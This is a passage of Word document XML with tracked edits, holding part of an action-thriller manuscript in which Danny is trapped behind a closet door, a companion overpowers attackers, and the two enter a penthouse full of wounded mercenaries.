          <w:delText>He d</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2924" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidR="00892940">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ig</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2925" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00892940">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>u</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:ins w:id="2926" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidR="00892940">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his heels into the floor</w:t>
      </w:r>
      <w:ins w:id="2927" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidR="00892940">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ins w:id="2928" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidR="00892940">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Danny</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2929" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00892940">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pressed his back against the door as the naked Russians beat and kicked </w:t>
      </w:r>
      <w:del w:id="2930" w:author="TextVet" w:date="2016-03-29T09:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E44754">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">against </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the outside.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“Guys…” he said</w:t>
      </w:r>
      <w:ins w:id="2931" w:author="TextVet" w:date="2016-03-29T09:14:00Z">
        <w:r w:rsidR="00E16C2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del w:id="2932" w:author="TextVet" w:date="2016-03-29T09:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E16C28">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gulp</w:t>
      </w:r>
      <w:ins w:id="2933" w:author="TextVet" w:date="2016-03-29T09:14:00Z">
        <w:r w:rsidR="00E16C28">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“I might</w:t>
      </w:r>
      <w:ins w:id="2934" w:author="TextVet" w:date="2016-03-29T09:14:00Z">
        <w:r w:rsidR="00E16C28">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2935" w:author="TextVet" w:date="2016-03-29T09:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E16C28">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ve made a slight miscalculation…”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answered him. “Danny! I see you on camera! Sit tight!” There was the sound of metallic clattering.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“I’ve got nowhere to go, Moshen,” Danny said. His muscles were beginning to give out. “Hey, Tina? Can you put us in a private channel? Just you and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she said. Background static disappeared.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“Listen… It really doesn’t look good for me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come on! You’ll think of a way out of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boots slipped along the floor as the strength in his legs faltered. “Look… I know you and I met literally yesterday… But I just… I want you to know…”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He was interrupted by </w:t>
      </w:r>
      <w:del w:id="2936" w:author="TextVet" w:date="2016-03-29T09:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E7520">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>loud wailing from the hallway outside. A young male voice screamed, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kyuuuuuaaaaaaaaah!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00370301" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2937" w:author="TextVet" w:date="2016-03-29T09:17:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2938" w:author="TextVet" w:date="2016-03-29T09:17:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00370301">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> series of hard impacts, of grunts and smacks, of kicks in stomachs and fists in faces</w:t>
      </w:r>
      <w:ins w:id="2939" w:author="TextVet" w:date="2016-03-29T09:17:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> followed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Hands and heads crashed against the walls beside the closet door.</w:t>
      </w:r>
      <w:del w:id="2940" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> It</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2941" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>L</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2942" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>l</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ast</w:t>
      </w:r>
      <w:ins w:id="2943" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2944" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for barely half a minute, </w:t>
      </w:r>
      <w:ins w:id="2945" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">it </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2946" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and came to an </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2947" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">ended </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>abrupt</w:t>
      </w:r>
      <w:ins w:id="2948" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ly</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2949" w:author="TextVet" w:date="2016-03-29T09:18:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="005E3117">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> stop</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488"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stood back, </w:t>
      </w:r>
      <w:del w:id="2950" w:author="TextVet" w:date="2016-03-29T09:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009D2060">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>let</w:t>
      </w:r>
      <w:ins w:id="2951" w:author="TextVet" w:date="2016-03-29T09:19:00Z">
        <w:r w:rsidR="009D2060">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ting</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the door swing open.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stood in the bright hallway</w:t>
      </w:r>
      <w:ins w:id="2952" w:author="TextVet" w:date="2016-03-29T09:19:00Z">
        <w:r w:rsidR="00536C2B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2953" w:author="TextVet" w:date="2016-03-29T09:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00536C2B">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del w:id="2954" w:author="TextVet" w:date="2016-03-29T09:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00536C2B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">In </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">both hands </w:t>
      </w:r>
      <w:del w:id="2955" w:author="TextVet" w:date="2016-03-29T09:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00536C2B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">he </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2956" w:author="TextVet" w:date="2016-03-29T09:20:00Z">
        <w:r w:rsidR="00536C2B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>clutching</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2957" w:author="TextVet" w:date="2016-03-29T09:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00536C2B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>held</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> long, sturdy metal rods that Danny recognized as mounting brackets, pulled from the back of the Claymore Communications van. He looked unhurt. At his feet, the three towel-clad men lay unconscious and bleeding. “Come on, Danny,” he said. “Grab your zappy-gun</w:t>
      </w:r>
      <w:ins w:id="2958" w:author="TextVet" w:date="2016-03-29T10:03:00Z">
        <w:r w:rsidR="000E79F9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2959" w:author="TextVet" w:date="2016-03-29T10:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E79F9">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let’s go see what happened to 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Danny gasped. “How… How did you… How did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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2960" w:author="TextVet" w:date="2016-03-29T10:03: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shrugged. “I told you when we first met, Danny: I know kung fu.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE0E87" w:rsidRPr="000D3488" w:rsidRDefault="00BE0E87" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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penthouse antechamber was silent</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. The gilded walls were pocked and dented with bullet holes. Spent bullet casings glinted yellow on the red carpet. A gentle breeze flowed in through the shattered windows. The large cedar doors hung slightly ajar.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="003B6C62" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Approaching the suite, </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Danny </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>heard</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> soft groaning, coughing, rattling breath. He used his HERF gun to prod the door open. The motion was</w:t>
      </w:r>
      <w:del w:id="2961" w:author="TextVet" w:date="2016-03-29T10:10:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003A54F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:ins w:id="2962" w:author="TextVet" w:date="2016-03-29T10:10:00Z">
        <w:r w:rsidR="003A54F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2963" w:author="TextVet" w:date="2016-03-29T10:10:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003A54F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t met with gunfire.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Inside, casualties littered the room, slumped over furniture and crumpled on the floor. Most of the mercenaries weren’t dead — at least, not yet. They twitched and coughed and pressed their hands against their wounds</w:t>
      </w:r>
      <w:commentRangeStart w:id="2964"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. The women seemed to have mostly avoided the gunfire</w:t>
      </w:r>
      <w:commentRangeEnd w:id="2964"/>
      <w:r w:rsidR="00AA2B07">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2964"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. One stood alone in a corner with her arms crossed, glaring contemptuously at Ivan’s men as they lay dying. Another held a mercenary in her arms as he struggled to breathe through a sucking chest wound.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squared his shoulders and entered. </w:t>
      </w:r>
      <w:ins w:id="2965" w:author="TextVet" w:date="2016-03-29T10:12:00Z">
        <w:r w:rsidR="00013582">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>G</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
